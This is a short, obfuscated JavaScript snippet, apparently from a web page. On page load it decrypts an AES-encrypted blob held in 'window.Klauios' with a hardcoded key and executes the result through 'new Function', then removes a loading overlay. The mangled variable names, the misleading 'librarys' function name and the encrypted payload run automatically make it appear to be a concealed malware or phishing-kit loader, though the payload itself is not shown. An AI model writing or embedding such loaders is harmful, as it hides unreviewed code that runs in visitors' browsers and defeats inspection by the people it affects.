const loadingOverlay = document.getElementById("loading-overlay");
function librarys(_0x57f872, _0x23c947) {
  var _0x5ede60 = forge.util.decode64(_0x57f872);
  var _0x21f13e = 16;
  var _0x15fa59 = _0x5ede60.substring(0, _0x21f13e);
  var _0x39257c = _0x5ede60.substring(_0x21f13e);
  var _0x219d80 = forge.cipher.createDecipher("AES-CBC", _0x23c947);
  var _0x5b7e4c = forge.util.createBuffer(_0x39257c);
  var _0x218f5c = {
    iv: _0x15fa59
  };
  _0x219d80.start(_0x218f5c);
  _0x219d80.update(_0x5b7e4c);
  var _0x21d55e = _0x219d80.finish();
  if (_0x21d55e) {
    var _0x5cd6f8 = _0x219d80.output.getBytes();
    var _0x26260f = forge.util.decodeUtf8(_0x5cd6f8);
    return _0x26260f;
  } else {
    return null;
  }
}
function executeCode() {
  const _0x1294b9 = "NEwyJBuP5igpkCIt8LYlo7hG2smOc3Fz";
  const _0x8066ac = librarys(window.Klauios, _0x1294b9);
  const _0x2cf1e8 = new Function(_0x8066ac);
  _0x2cf1e8();
}
executeCode();
loadingOverlay.remove();